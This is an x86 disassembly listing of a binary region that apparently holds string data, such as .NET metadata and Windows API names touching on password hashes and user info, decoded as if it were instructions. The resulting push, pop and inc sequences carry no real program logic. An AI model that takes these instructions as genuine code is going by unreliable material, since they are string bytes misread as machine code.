  4057fb:	inc    ecx
  4057fc:	push   esp
  4057fd:	inc    ebp
  4057fe:	pop    edi
  4057ff:	dec    edi
  405800:	push   ebp
  405801:	push   esp
  405802:	push   eax
  405803:	push   ebp
  405804:	push   esp
  405805:	pop    edi
  405806:	inc    ecx
  405807:	push   edx
  405808:	inc    edi
  405809:	add    BYTE PTR [esi+0x49],al
  40580c:	dec    esp
  40580d:	inc    ebp
  40580e:	push   esp
  40580f:	dec    ecx
  405810:	dec    ebp
  405811:	inc    ebp
  405812:	add    BYTE PTR [esi+0x45],cl
  405815:	push   esp
  405816:	pop    edi
  405817:	push   esi
  405818:	inc    ecx
  405819:	dec    esp
  40581a:	dec    ecx
  40581b:	inc    esp
  40581c:	inc    ecx
  40581d:	push   esp
  40581e:	inc    ebp
  40581f:	pop    edi
  405820:	push   eax
  405821:	inc    ecx
  405822:	push   ebx
  405823:	push   ebx
  405824:	push   edi
  405825:	dec    edi
  405826:	push   edx
  405827:	inc    esp
  405828:	pop    edi
  405829:	dec    eax
  40582a:	inc    ecx
  40582b:	push   ebx
  40582c:	dec    eax
  40582d:	add    BYTE PTR [esi+0x45],cl
  405830:	push   esp
  405831:	pop    edi
  405832:	push   esi
  405833:	inc    ecx
  405834:	dec    esp
  405835:	dec    ecx
  405836:	inc    esp
  405837:	inc    ecx
  405838:	push   esp
  405839:	inc    ebp
  40583a:	pop    edi
  40583b:	push   eax
  40583c:	inc    ebp
  40583d:	push   edx
  40583e:	push   ebx
  40583f:	dec    ecx
  405840:	push   ebx
  405841:	push   esp
  405842:	inc    ebp
  405843:	inc    esp
  405844:	pop    edi
  405845:	inc    esi
  405846:	dec    ecx
  405847:	inc    ebp
  405848:	dec    esp
  405849:	inc    esp
  40584a:	push   ebx
  40584b:	add    BYTE PTR [esi+0x45],cl
  40584e:	push   esp
  40584f:	pop    edi
  405850:	push   esi
  405851:	inc    ecx
  405852:	dec    esp
  405853:	dec    ecx
  405854:	inc    esp
  405855:	inc    ecx
  405856:	push   esp
  405857:	inc    ebp
  405858:	pop    edi
  405859:	push   eax
  40585a:	inc    ecx
  40585b:	push   ebx
  40585c:	push   ebx
  40585d:	push   edi
  40585e:	dec    edi
  40585f:	push   edx
  405860:	inc    esp
  405861:	pop    edi
  405862:	push   esp
  405863:	pop    ecx
  405864:	push   eax
  405865:	inc    ebp
  405866:	add    BYTE PTR [edi+ecx*2+0x43],cl
  40586a:	inc    ecx
  40586b:	dec    esp
  40586c:	inc    edi
  40586d:	push   edx
  40586e:	dec    edi
  40586f:	push   ebp
  405870:	push   eax
  405871:	pop    edi
  405872:	dec    ebp
  405873:	inc    ebp
  405874:	dec    ebp
  405875:	inc    edx
  405876:	inc    ebp
  405877:	push   edx
  405878:	push   ebx
  405879:	pop    edi
  40587a:	dec    ecx
  40587b:	dec    esi
  40587c:	inc    esi
  40587d:	dec    edi
  40587e:	pop    edi
  40587f:	xor    BYTE PTR [eax],al
  405881:	push   ebx
  405882:	dec    ecx
  405883:	inc    esp
  405884:	pop    edi
  405885:	dec    ecx
  405886:	inc    esp
  405887:	inc    ebp
  405888:	dec    esi
  405889:	push   esp
  40588a:	dec    ecx
  40588b:	inc    esi
  40588c:	dec    ecx
  40588d:	inc    ebp
  40588e:	push   edx
  40588f:	pop    edi
  405890:	inc    ecx
  405891:	push   ebp
  405892:	push   esp
  405893:	dec    eax
  405894:	dec    edi
  405895:	push   edx
  405896:	dec    ecx
  405897:	push   esp
  405898:	pop    ecx
  405899:	add    BYTE PTR [ebx+0x4f],al
  40589c:	dec    ebp
  40589d:	push   eax
  40589e:	push   ebp
  40589f:	push   esp
  4058a0:	inc    ebp
  4058a1:	push   edx
  4058a2:	pop    edi
  4058a3:	dec    esi
  4058a4:	inc    ecx
  4058a5:	dec    ebp
  4058a6:	inc    ebp
  4058a7:	pop    edi
  4058a8:	inc    esi
  4058a9:	dec    edi
  4058aa:	push   edx
  4058ab:	dec    ebp
  4058ac:	inc    ecx
  4058ad:	push   esp
  4058ae:	add    BYTE PTR [ecx+0x6e],cl
  4058b1:	jbe    0x405914
  4058b3:	ins    BYTE PTR es:[edi],dx
  4058b4:	imul   esp,DWORD PTR [eax+edx*2+0x61],0x6f777373
  4058bc:	jb     0x405922
  4058be:	push   edx
  4058bf:	gs popa 
  4058c1:	jae    0x405932
  4058c3:	outs   dx,BYTE PTR ds:[esi]
  4058c4:	add    BYTE PTR [ebp+0x69],cl
  4058c7:	arpl   WORD PTR [edx+0x6f],si
  4058ca:	jae    0x40593b
  4058cc:	data16 je 0x4058fd
  4058cf:	push   edi
  4058d0:	bound  ecx,QWORD PTR gs:[ebp+0x61]
  4058d4:	je     0x405948
  4058d6:	imul   edi,DWORD PTR [eax+0x2e],0x65726f43
  4058dd:	cs push ebx
  4058df:	gs jb  0x405958
  4058e2:	gs jb  0x4058e5
  4058e5:	push   esi
  4058e6:	popa   
  4058e7:	ins    BYTE PTR es:[edi],dx
  4058e8:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x736d0065
  4058f0:	arpl   WORD PTR [edi+0x72],bp
  4058f3:	ins    BYTE PTR es:[edi],dx
  4058f4:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4058fb:	gs ins DWORD PTR es:[edi],dx
  4058fd:	add    BYTE PTR [edi+0x62],cl
  405900:	push   0x65
  405902:	arpl   WORD PTR [eax+eax*1+0x45],si
  405906:	outs   dx,BYTE PTR ds:[esi]
  405907:	jne    0x405976
  405909:	add    BYTE PTR [esi+0x61],dl
  40590c:	ins    BYTE PTR es:[edi],dx
  40590d:	jne    0x405974
  40590f:	push   esp
  405910:	jns    0x405982
  405912:	add    BYTE PTR gs:[ebp+0x69],cl
  405916:	arpl   WORD PTR [edx+0x6f],si
  405919:	jae    0x40598a
  40591b:	data16 je 0x40594c
  40591e:	push   edi
  40591f:	imul   ebp,DWORD PTR [esi+0x33],0x61532e32
  405926:	gs dec ax
  405929:	popa   
  40592a:	outs   dx,BYTE PTR ds:[esi]
  40592b:	fs ins BYTE PTR es:[edi],dx
  40592d:	gs jae 0x405930
  405930:	push   ebx
  405931:	popa   
  405932:	gs dec ax
  405935:	popa   
  405936:	outs   dx,BYTE PTR ds:[esi]
  405937:	fs ins BYTE PTR es:[edi],dx
  405939:	gs pop edx
  40593b:	gs jb  0x4059ad
  40593e:	dec    edi
  40593f:	jb     0x40598e
  405941:	imul   ebp,DWORD PTR [esi+0x75],0x656e4f73
  405948:	dec    ecx
  405949:	jae    0x405994
  40594b:	outs   dx,BYTE PTR ds:[esi]
  40594c:	jbe    0x4059af
  40594e:	ins    BYTE PTR es:[edi],dx
  40594f:	imul   esp,DWORD PTR [eax+eax*1+0x75],0x73006c72
  405957:	jae    0x4059c5
  405959:	inc    ebx
  40595a:	gs jb  0x4059d1
  40595d:	imul   esp,DWORD PTR [esi+0x69],0x65746163
  405964:	dec    eax
  405965:	popa   
  405966:	jae    0x4059d0
  405968:	add    BYTE PTR [ebp+0x73],dh
  40596b:	gs push ebx
  40596d:	gs ins BYTE PTR es:[edi],dx
  40596f:	push   bx
  405971:	imul   esp,DWORD PTR [edi+0x6e],0x63006465
  405978:	outs   dx,DWORD PTR ds:[esi]
  405979:	ins    DWORD PTR es:[edi],dx
  40597a:	ins    DWORD PTR es:[edi],dx
  40597b:	popa   
  40597c:	outs   dx,BYTE PTR ds:[esi]
  40597d:	add    BYTE PTR fs:[eax+0x61],dh
  405981:	jne    0x4059f6
  405983:	add    BYTE PTR gs:[esi+0x65],dh
  405987:	jb     0x4059eb
  405989:	outs   dx,DWORD PTR ds:[esi]
  40598a:	jae    0x4059f1
  40598c:	add    BYTE PTR [edi+0x75],ch
  40598f:	je     0x4059e1
  405991:	popa   
  405992:	je     0x4059fc
  405994:	add    BYTE PTR [esi],ch
  405996:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40599a:	add    BYTE PTR [ebx+0x65],dl
  40599d:	je     0x405a14
  40599f:	jo     0x4059ea
  4059a1:	dec    ecx
  4059a2:	push   ebx
  4059a3:	inc    ebp
  4059a4:	js     0x405a16
  4059a6:	jb     0x405a0d
  4059a8:	jae    0x405a1d
  4059aa:	push   ebp
  4059ab:	jae    0x405a12
  4059ad:	jb     0x4059f7
  4059af:	outs   dx,DWORD PTR ds:[esi]
  4059b0:	ins    DWORD PTR es:[edi],dx
  4059b1:	add    BYTE PTR gs:[edi+0x65],al
  4059b5:	je     0x405a00
  4059b7:	dec    ecx
  4059b8:	push   ebx
  4059b9:	inc    ebp
  4059ba:	js     0x405a2c
  4059bc:	jb     0x405a23
  4059be:	jae    0x405a33
  4059c0:	push   ebp
  4059c1:	jae    0x405a28
  4059c3:	jb     0x405a0d
  4059c5:	outs   dx,DWORD PTR ds:[esi]
  4059c6:	ins    DWORD PTR es:[edi],dx
  4059c7:	gs push eax
  4059c9:	popa   
  4059ca:	je     0x405a34
  4059cc:	dec    esi
  4059cd:	popa   
  4059ce:	je     0x405a39
  4059d0:	jbe    0x405a37
  4059d2:	add    BYTE PTR [edi+0x65],al
  4059d5:	je     0x405a20
  4059d7:	dec    ecx
  4059d8:	push   ebx
  4059d9:	inc    ebp
  4059da:	js     0x405a4c
  4059dc:	jb     0x405a43
  4059de:	jae    0x405a53
  4059e0:	push   ebp
  4059e1:	jae    0x405a48
  4059e3:	jb     0x405a26
  4059e5:	jo     0x405a57
  4059e7:	dec    eax
  4059e8:	outs   dx,DWORD PTR ds:[esi]
  4059e9:	jae    0x405a5f
  4059eb:	inc    ebx
  4059ec:	outs   dx,DWORD PTR ds:[esi]
  4059ed:	outs   dx,BYTE PTR ds:[esi]
  4059ee:	imul   sp,WORD PTR [edi+0x46],0x6c69
  4059f4:	gs dec esi
  4059f6:	popa   
  4059f7:	je     0x405a62
  4059f9:	jbe    0x405a60
  4059fb:	add    BYTE PTR [edi+0x65],al
  4059fe:	je     0x405a49
  405a00:	dec    ecx
  405a01:	push   ebx
  405a02:	inc    ebp
  405a03:	js     0x405a75
  405a05:	jb     0x405a6c
  405a07:	jae    0x405a7c
  405a09:	push   ebp
  405a0a:	jae    0x405a71
  405a0c:	jb     0x405a56
  405a0e:	outs   dx,DWORD PTR ds:[esi]
  405a0f:	ins    DWORD PTR es:[edi],dx
  405a10:	gs push eax
  405a12:	popa   
  405a13:	je     0x405a7d
  405a15:	add    BYTE PTR [edi+0x65],al
  405a18:	je     0x405a63
  405a1a:	dec    ecx
  405a1b:	push   ebx
  405a1c:	inc    ebp
  405a1d:	js     0x405a8f
  405a1f:	jb     0x405a86
  405a21:	jae    0x405a96
  405a23:	push   ebp
  405a24:	jae    0x405a8b
  405a26:	jb     0x405a69
  405a28:	jo     0x405a9a
  405a2a:	dec    eax
  405a2b:	outs   dx,DWORD PTR ds:[esi]
  405a2c:	jae    0x405aa2
  405a2e:	inc    ebx
  405a2f:	outs   dx,DWORD PTR ds:[esi]
  405a30:	outs   dx,BYTE PTR ds:[esi]
  405a31:	imul   sp,WORD PTR [edi+0x46],0x6c69
  405a37:	add    BYTE PTR gs:[edi+0x76],bl
  405a3b:	gs jb  0x405aa0
  405a3e:	outs   dx,DWORD PTR ds:[esi]
  405a3f:	jae    0x405aa6
  405a41:	add    BYTE PTR [ebp+0x69],cl
  405a44:	arpl   WORD PTR [edx+0x6f],si
  405a47:	jae    0x405ab8
  405a49:	data16 je 0x405a7a
  405a4c:	push   edi
  405a4d:	bound  ebp,QWORD PTR gs:[esi]
  405a50:	push   esp
  405a51:	popa   
  405a52:	jae    0x405abf
  405a54:	jae    0x405a56
  405a56:	dec    ecx
  405a57:	inc    ebp
  405a58:	ins    BYTE PTR es:[edi],dx
  405a59:	gs jbe 0x405abd
  405a5c:	je     0x405ac3
  405a5e:	fs push esp
  405a60:	popa   
  405a61:	jae    0x405ace
  405a63:	jae    0x405a65
  405a65:	inc    edi
  405a66:	gs je  0x405aae
  405a69:	ins    BYTE PTR es:[edi],dx
  405a6a:	gs jbe 0x405ace
  405a6d:	je     0x405ad4
  405a6f:	fs push esp
  405a71:	popa   
  405a72:	jae    0x405adf
  405a74:	jae    0x405abf
  405a76:	outs   dx,BYTE PTR ds:[esi]
  405a77:	jae    0x405aed
  405a79:	popa   
  405a7a:	outs   dx,BYTE PTR ds:[esi]
  405a7b:	arpl   WORD PTR [ebp+0x0],sp
  405a7e:	inc    ebp
  405a7f:	js     0x405ae4
  405a81:	gs jo  0x405af8
  405a84:	imul   ebp,DWORD PTR [edi+0x6e],0x6f725000
  405a8b:	arpl   WORD PTR [ebp+0x73],sp
  405a8e:	jae    0x405ad5
  405a90:	js     0x405af5
  405a92:	gs jo  0x405b09
  405a95:	imul   ebp,DWORD PTR [edi+0x6e],0x69614d00
  405a9c:	outs   dx,BYTE PTR ds:[esi]
  405a9d:	add    BYTE PTR [ebx+0x68],dl
  405aa0:	outs   dx,DWORD PTR ds:[esi]
  405aa1:	ja     0x405ae6
  405aa3:	gs jb  0x405b1a
  405aa6:	imul   esp,DWORD PTR [esi+0x69],0x65746163
  405aad:	jae    0x405aaf
  405aaf:	inc    esp
  405ab0:	imul   esp,DWORD PTR [ecx+0x67],0x65736f6e
  405ab7:	push   ebp
  405ab8:	jb     0x405b26
  405aba:	add    BYTE PTR [ebx+0x72],al
  405abd:	gs popa 
  405abf:	je     0x405b26
  405ac1:	inc    ecx
  405ac2:	jae    0x405b34
  405ac4:	dec    esi
  405ac5:	gs je  0x405b10
  405ac8:	outs   dx,DWORD PTR ds:[esi]
  405ac9:	jae    0x405b3f
  405acb:	inc    ebx
  405acc:	outs   dx,DWORD PTR ds:[esi]
  405acd:	outs   dx,BYTE PTR ds:[esi]
  405ace:	imul   sp,WORD PTR [edi+0x46],0x6c69
  405ad4:	add    BYTE PTR gs:[eax+0x61],dl
  405ad8:	jb     0x405b4d
  405ada:	gs inc ebx
  405adc:	outs   dx,DWORD PTR ds:[esi]
  405add:	ins    DWORD PTR es:[edi],dx
  405ade:	ins    DWORD PTR es:[edi],dx
  405adf:	popa   
  405ae0:	outs   dx,BYTE PTR ds:[esi]
  405ae1:	fs dec esp
  405ae3:	imul   ebp,DWORD PTR [esi+0x65],0x75677241
  405aea:	ins    DWORD PTR es:[edi],dx
  405aeb:	outs   dx,BYTE PTR gs:[esi]
  405aed:	je     0x405b62
  405aef:	add    BYTE PTR [edi+0x65],al
  405af2:	je     0x405b44
  405af4:	popa   
  405af5:	jb     0x405b58
  405af7:	ins    DWORD PTR es:[edi],dx
  405af8:	push   esi
  405af9:	popa   
  405afa:	ins    BYTE PTR es:[edi],dx
  405afb:	jne    0x405b62
  405afd:	add    BYTE PTR [ebx+0x68],al
  405b00:	arpl   WORD PTR gs:[ebx+0x4e],bp
  405b04:	outs   dx,DWORD PTR ds:[esi]
  405b05:	push   eax
  405b06:	popa   
  405b07:	jb     0x405b6a
  405b09:	ins    DWORD PTR es:[edi],dx
  405b0a:	push   esi
  405b0b:	popa   
  405b0c:	ins    BYTE PTR es:[edi],dx
  405b0d:	jne    0x405b74
  405b0f:	add    BYTE PTR [edi+0x75],al
  405b12:	imul   esp,DWORD PTR [eax+eax*1+0x43],0x7465476f
  405b1a:	dec    edi
  405b1b:	bound  ebp,QWORD PTR [edx+0x65]
  405b1e:	arpl   WORD PTR [eax+eax*1+0x43],si
  405b22:	outs   dx,DWORD PTR ds:[esi]
  405b23:	inc    ebx
  405b24:	jb     0x405b8b
  405b26:	popa   
  405b27:	je     0x405b8e
  405b29:	dec    ecx
  405b2a:	outs   dx,BYTE PTR ds:[esi]
  405b2b:	jae    0x405ba1
  405b2d:	popa   
  405b2e:	outs   dx,BYTE PTR ds:[esi]
  405b2f:	arpl   WORD PTR [ebp+0x41],sp
  405b32:	jae    0x405b75
  405b34:	fs ins DWORD PTR es:[edi],dx
  405b36:	imul   ebp,DWORD PTR [esi+0x0],0x756c6176
  405b3d:	gs pop edi
  405b3f:	pop    edi
  405b40:	add    BYTE PTR [ebx+0x4c],al
  405b43:	push   ebx
  405b44:	inc    ebx
  405b45:	push   esp
  405b46:	pop    eax
  405b47:	pop    edi
  405b48:	dec    ecx
  405b49:	dec    esi
  405b4a:	push   eax
  405b4b:	push   edx
  405b4c:	dec    edi
  405b4d:	inc    ebx
  405b4e:	pop    edi
  405b4f:	push   ebx
  405b50:	inc    ebp
  405b51:	push   edx
  405b52:	push   esi
  405b53:	inc    ebp
  405b54:	push   edx
  405b55:	add    BYTE PTR [ebx+0x4c],al
  405b58:	push   ebx
  405b59:	inc    ebx
  405b5a:	push   esp
  405b5b:	pop    eax
  405b5c:	pop    edi
  405b5d:	dec    ecx
  405b5e:	dec    esi
  405b5f:	push   eax
  405b60:	push   edx
  405b61:	dec    edi
  405b62:	inc    ebx
  405b63:	pop    edi
  405b64:	dec    eax
  405b65:	inc    ecx
  405b66:	dec    esi
  405b67:	inc    esp
  405b68:	dec    esp
  405b69:	inc    ebp
  405b6a:	push   edx
  405b6b:	add    BYTE PTR [ebx+0x4c],al
  405b6e:	push   ebx
  405b6f:	inc    ebx
  405b70:	push   esp
  405b71:	pop    eax
  405b72:	pop    edi
  405b73:	dec    esp
  405b74:	dec    edi
  405b75:	inc    ebx
  405b76:	inc    ecx
  405b77:	dec    esp
  405b78:	pop    edi
  405b79:	push   ebx
  405b7a:	inc    ebp
  405b7b:	push   edx
  405b7c:	push   esi
  405b7d:	inc    ebp
  405b7e:	push   edx
  405b7f:	add    BYTE PTR [ebx+0x4c],al
  405b82:	push   ebx
  405b83:	inc    ebx
  405b84:	push   esp
  405b85:	pop    eax
  405b86:	pop    edi
  405b87:	dec    ecx
  405b88:	dec    esi
  405b89:	push   eax
  405b8a:	push   edx
  405b8b:	dec    edi
  405b8c:	inc    ebx
  405b8d:	pop    edi
  405b8e:	push   ebx
  405b8f:	inc    ebp
  405b90:	push   edx
  405b91:	push   esi
  405b92:	inc    ebp
  405b93:	push   edx
  405b94:	xor    DWORD PTR [esi],esi
  405b96:	add    BYTE PTR [ebx+0x4c],al
  405b99:	push   ebx
  405b9a:	inc    ebx
  405b9b:	push   esp
  405b9c:	pop    eax
  405b9d:	pop    edi
  405b9e:	push   edx
  405b9f:	inc    ebp
  405ba0:	dec    ebp
  405ba1:	dec    edi
  405ba2:	push   esp
  405ba3:	inc    ebp
  405ba4:	pop    edi
  405ba5:	push   ebx
  405ba6:	inc    ebp
  405ba7:	push   edx
  405ba8:	push   esi
  405ba9:	inc    ebp
  405baa:	push   edx
  405bab:	add    BYTE PTR [ebx+0x4c],al
  405bae:	push   ebx
  405baf:	inc    ebx
  405bb0:	push   esp
  405bb1:	pop    eax
  405bb2:	pop    edi
  405bb3:	dec    ecx
  405bb4:	dec    esi
  405bb5:	push   eax
  405bb6:	push   edx
  405bb7:	dec    edi
  405bb8:	inc    ebx
  405bb9:	pop    edi
  405bba:	dec    eax
  405bbb:	inc    ecx
  405bbc:	dec    esi
  405bbd:	inc    esp
  405bbe:	dec    esp
  405bbf:	inc    ebp
  405bc0:	push   edx
  405bc1:	xor    DWORD PTR [esi],esi
  405bc3:	add    BYTE PTR [ebx+0x4c],al
  405bc6:	push   ebx
  405bc7:	inc    ebx
  405bc8:	push   esp
  405bc9:	pop    eax
  405bca:	pop    edi
  405bcb:	push   edx
  405bcc:	inc    ebp
  405bcd:	push   ebx
  405bce:	inc    ebp
  405bcf:	push   edx
  405bd0:	push   esi
  405bd1:	inc    ebp
  405bd2:	inc    esp
  405bd3:	xor    DWORD PTR [eax],eax
  405bd5:	inc    ebx
  405bd6:	dec    esp
  405bd7:	push   ebx
  405bd8:	inc    ebx
  405bd9:	push   esp
  405bda:	pop    eax
  405bdb:	pop    edi
  405bdc:	push   edx
  405bdd:	inc    ebp
  405bde:	push   ebx
  405bdf:	inc    ebp
  405be0:	push   edx
  405be1:	push   esi
  405be2:	inc    ebp
  405be3:	inc    esp
  405be4:	xor    al,BYTE PTR [eax]
  405be6:	inc    ebx
  405be7:	dec    esp
  405be8:	push   ebx
  405be9:	inc    ebx
  405bea:	push   esp
  405beb:	pop    eax
  405bec:	pop    edi
  405bed:	push   edx
  405bee:	inc    ebp
  405bef:	push   ebx
  405bf0:	inc    ebp
  405bf1:	push   edx
  405bf2:	push   esi
  405bf3:	inc    ebp
  405bf4:	inc    esp
  405bf5:	xor    eax,DWORD PTR [eax]
  405bf7:	inc    ebx
  405bf8:	dec    esp
  405bf9:	push   ebx
  405bfa:	inc    ebx
  405bfb:	push   esp
  405bfc:	pop    eax
  405bfd:	pop    edi
  405bfe:	push   edx
  405bff:	inc    ebp
  405c00:	push   ebx
  405c01:	inc    ebp
  405c02:	push   edx
  405c03:	push   esi
  405c04:	inc    ebp
  405c05:	inc    esp
  405c06:	xor    al,0x0
  405c08:	inc    ebx
  405c09:	dec    esp
  405c0a:	push   ebx
  405c0b:	inc    ebx
  405c0c:	push   esp
  405c0d:	pop    eax
  405c0e:	pop    edi
  405c0f:	dec    esi
  405c10:	dec    edi
  405c11:	pop    edi
  405c12:	inc    ebx
  405c13:	dec    edi
  405c14:	inc    esp
  405c15:	inc    ebp
  405c16:	pop    edi
  405c17:	inc    esp
  405c18:	dec    edi
  405c19:	push   edi
  405c1a:	dec    esi
  405c1b:	dec    esp
  405c1c:	dec    edi
  405c1d:	inc    ecx
  405c1e:	inc    esp
  405c1f:	add    BYTE PTR [ebx+0x4c],al
  405c22:	push   ebx
  405c23:	inc    ebx
  405c24:	push   esp
  405c25:	pop    eax
  405c26:	pop    edi
  405c27:	push   edx
  405c28:	inc    ebp
  405c29:	push   ebx
  405c2a:	inc    ebp
  405c2b:	push   edx
  405c2c:	push   esi
  405c2d:	inc    ebp
  405c2e:	inc    esp
  405c2f:	xor    eax,0x534c4300
  405c34:	inc    ebx
  405c35:	push   esp
  405c36:	pop    eax
  405c37:	pop    edi
  405c38:	dec    esi
  405c39:	dec    edi
  405c3a:	pop    edi
  405c3b:	inc    ebx
  405c3c:	push   ebp
  405c3d:	push   ebx
  405c3e:	push   esp
  405c3f:	dec    edi
  405c40:	dec    ebp
  405c41:	pop    edi
  405c42:	dec    ebp
  405c43:	inc    ecx
  405c44:	push   edx
  405c45:	push   ebx
  405c46:	dec    eax
  405c47:	inc    ecx
  405c48:	dec    esp
  405c49:	add    BYTE PTR [ebx+0x4c],al
  405c4c:	push   ebx
  405c4d:	inc    ebx
  405c4e:	push   esp
  405c4f:	pop    eax
  405c50:	pop    edi
  405c51:	inc    ebp
  405c52:	dec    esi
  405c53:	inc    ecx
  405c54:	inc    edx
  405c55:	dec    esp
  405c56:	inc    ebp
  405c57:	pop    edi
  405c58:	inc    ebx
  405c59:	dec    edi
  405c5a:	inc    esp
  405c5b:	inc    ebp
  405c5c:	pop    edi
  405c5d:	inc    esp
  405c5e:	dec    edi
  405c5f:	push   edi
  405c60:	dec    esi
  405c61:	dec    esp
  405c62:	dec    edi
  405c63:	inc    ecx
  405c64:	inc    esp
  405c65:	add    BYTE PTR [ebx+0x4c],al
  405c68:	push   ebx
  405c69:	inc    ebx
  405c6a:	push   esp
  405c6b:	pop    eax
  405c6c:	pop    edi
  405c6d:	dec    esi
  405c6e:	dec    edi
  405c6f:	pop    edi
  405c70:	inc    esi
  405c71:	inc    ecx
  405c72:	dec    ecx
  405c73:	dec    esp
  405c74:	push   ebp
  405c75:	push   edx
  405c76:	inc    ebp
  405c77:	pop    edi
  405c78:	dec    esp
  405c79:	dec    edi
  405c7a:	inc    edi
  405c7b:	add    BYTE PTR [ebx+0x4c],al
  405c7e:	push   ebx
  405c7f:	inc    ebx
  405c80:	push   esp
  405c81:	pop    eax
  405c82:	pop    edi
  405c83:	inc    esp
  405c84:	dec    ecx
  405c85:	push   ebx
  405c86:	inc    ecx
  405c87:	inc    edx
  405c88:	dec    esp
  405c89:	inc    ebp
  405c8a:	pop    edi
  405c8b:	inc    ecx
  405c8c:	inc    ecx
  405c8d:	inc    ecx
  405c8e:	add    BYTE PTR [ebx+0x4c],al
  405c91:	push   ebx
  405c92:	inc    ebx
  405c93:	push   esp
  405c94:	pop    eax
  405c95:	pop    edi
  405c96:	inc    ebp
  405c97:	dec    esi
  405c98:	inc    ecx
  405c99:	inc    edx
  405c9a:	dec    esp
  405c9b:	inc    ebp
  405c9c:	pop    edi
  405c9d:	inc    ecx
  405c9e:	inc    ecx
  405c9f:	inc    ecx
  405ca0:	add    BYTE PTR [ebx+0x4c],al
  405ca3:	push   ebx
  405ca4:	inc    ebx
  405ca5:	push   esp
  405ca6:	pop    eax
  405ca7:	pop    edi
  405ca8:	inc    esi
  405ca9:	push   edx
  405caa:	dec    edi
  405cab:	dec    ebp
  405cac:	pop    edi
  405cad:	inc    esp
  405cae:	inc    ebp
  405caf:	inc    esi
  405cb0:	inc    ecx
  405cb1:	push   ebp
  405cb2:	dec    esp
  405cb3:	push   esp
  405cb4:	pop    edi
  405cb5:	inc    ebx
  405cb6:	dec    edi
  405cb7:	dec    esi
  405cb8:	push   esp
  405cb9:	inc    ebp
  405cba:	pop    eax
  405cbb:	push   esp
  405cbc:	add    BYTE PTR [ebx+0x4c],al
  405cbf:	push   ebx
  405cc0:	inc    ebx
  405cc1:	push   esp
  405cc2:	pop    eax
  405cc3:	pop    edi
  405cc4:	dec    ecx
  405cc5:	dec    esi
  405cc6:	push   eax
  405cc7:	push   edx
  405cc8:	dec    edi
  405cc9:	inc    ebx
  405cca:	add    BYTE PTR [ebx+0x4c],al
  405ccd:	push   ebx
  405cce:	inc    ebx
  405ccf:	push   esp
  405cd0:	pop    eax
  405cd1:	pop    edi
  405cd2:	push   ebx
  405cd3:	inc    ebp
  405cd4:	push   edx
  405cd5:	push   esi
  405cd6:	inc    ebp
  405cd7:	push   edx
  405cd8:	add    BYTE PTR [ebx+0x4c],al
  405cdb:	push   ebx
  405cdc:	inc    ebx
  405cdd:	push   esp
  405cde:	pop    eax
  405cdf:	pop    edi
  405ce0:	inc    ecx
  405ce1:	dec    esp
  405ce2:	dec    esp
  405ce3:	add    BYTE PTR [ebx+0x62],ah
  405ce6:	push   ebx
  405ce7:	je     0x405d5b
  405ce9:	jne    0x405d4e
  405ceb:	je     0x405ced
  405ced:	addr16 jb 0x405d56
  405cf0:	inc    esi
  405cf1:	ins    BYTE PTR es:[edi],dx
  405cf2:	popa   
  405cf3:	addr16 jae 0x405cf6
  405cf6:	addr16 jb 0x405d5f
  405cf9:	dec    ebp
  405cfa:	outs   dx,DWORD PTR ds:[esi]
  405cfb:	fs add BYTE PTR gs:[edi+esi*2+0x54],ah
  405d01:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  405d08:	je     0x405d4e
  405d0a:	gs popa 
  405d0c:	fs ins BYTE PTR es:[edi],dx
  405d0e:	imul   ebp,DWORD PTR [esi+0x65],0x54776400
  405d15:	jb     0x405d78
  405d17:	arpl   WORD PTR [ebx+0x46],bp
  405d1a:	ins    BYTE PTR es:[edi],dx
  405d1b:	popa   
  405d1c:	addr16 jae 0x405d1f
  405d1f:	fs ja  0x405d65
  405d22:	ins    BYTE PTR es:[edi],dx
  405d23:	popa   
  405d24:	jae    0x405d99
  405d26:	inc    ebx
  405d27:	outs   dx,DWORD PTR ds:[esi]
  405d28:	outs   dx,BYTE PTR ds:[esi]
  405d29:	je     0x405d90
  405d2b:	js     0x405da1
  405d2d:	add    BYTE PTR [edi+ebp*2+0x63],ch
  405d31:	popa   
  405d32:	ins    BYTE PTR es:[edi],dx
  405d33:	add    BYTE PTR gs:[eax+0x53],dh
  405d37:	gs jb  0x405db0
  405d3a:	gs jb  0x405d86
  405d3d:	outs   dx,BYTE PTR ds:[esi]
  405d3e:	outs   dx,WORD PTR ds:[esi]
  405d40:	add    BYTE PTR [eax+0x77],ch
  405d43:	outs   dx,BYTE PTR ds:[esi]
  405d44:	add    BYTE PTR fs:[edi+0x65],al
  405d48:	je     0x405d9e
  405d4a:	jns    0x405dbc
  405d4c:	gs dec ecx
  405d4e:	outs   dx,BYTE PTR ds:[esi]
  405d4f:	outs   dx,WORD PTR ds:[esi]
  405d51:	inc    ebx
  405d52:	outs   dx,DWORD PTR ds:[esi]
  405d53:	jne    0x405dc3
  405d55:	je     0x405d57
  405d57:	push   ebx
  405d58:	jns    0x405dcd
  405d5a:	je     0x405dc1
  405d5c:	ins    DWORD PTR es:[edi],dx
  405d5d:	cs push edx
  405d5f:	jne    0x405dcf
  405d61:	je     0x405dcc
  405d63:	ins    DWORD PTR es:[edi],dx
  405d64:	gs cs dec ecx
  405d67:	outs   dx,BYTE PTR ds:[esi]
  405d68:	je     0x405dcf
  405d6a:	jb     0x405ddb
  405d6c:	jo     0x405dc1
  405d6e:	gs jb  0x405de7
  405d71:	imul   esp,DWORD PTR [ebx+0x65],0x6f432e73
  405d78:	ins    DWORD PTR es:[edi],dx
  405d79:	push   esp
  405d7a:	jns    0x405dec
  405d7c:	gs jae 0x405d7f
  405d7f:	dec    ecx
  405d80:	push   esp
  405d81:	jns    0x405df3
  405d83:	gs dec ecx
  405d85:	outs   dx,BYTE PTR ds:[esi]
  405d86:	outs   dx,WORD PTR ds:[esi]
  405d88:	add    BYTE PTR [edi+0x65],al
  405d8b:	je     0x405de1
  405d8d:	jns    0x405dff
  405d8f:	gs dec ecx
  405d91:	outs   dx,BYTE PTR ds:[esi]
  405d92:	outs   dx,WORD PTR ds:[esi]
  405d94:	add    BYTE PTR [edi+0x65],al
  405d97:	je     0x405de2
  405d99:	inc    esp
  405d9a:	jae    0x405deb
  405d9c:	dec    si
  405d9e:	popa   
  405d9f:	ins    DWORD PTR es:[edi],dx
  405da0:	gs jae 0x405da3
  405da3:	inc    esp
  405da4:	dec    ecx
  405da5:	push   ebx
  405da6:	push   eax
  405da7:	push   eax
  405da8:	inc    ecx
  405da9:	push   edx
